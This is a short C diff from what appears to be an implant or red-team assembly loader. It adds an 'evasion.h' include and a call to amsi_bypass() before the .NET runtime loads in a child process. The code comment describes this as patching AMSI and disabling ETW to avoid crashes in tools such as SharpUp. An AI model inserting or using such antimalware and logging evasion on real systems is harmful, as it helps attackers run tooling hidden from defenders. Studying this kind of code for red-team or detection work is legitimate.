@@ -12,6 +12,7 @@
 #include <windows.h>
 #include <objbase.h>
 #include "api_resolve.h"
+#include "evasion.h"
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
@@ -731,6 +732,11 @@ void clr_child_run(void) {
     // VEH fires before those SEH frames and would wrongly terminate the process
     // on any managed exception. Genuine native crashes are reported by the
     // parent via the non-zero exit code path in fork_run_assembly.
+
+    // Patch AMSI and disable ETW before loading the CLR so that .NET assemblies
+    // that perform P/Invoke or WMI operations (e.g. SharpUp audit) do not crash
+    // due to AMSI-hook-induced memory corruption in the child process.
+    amsi_bypass();
 
     HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
     BYTE   hdr[4];
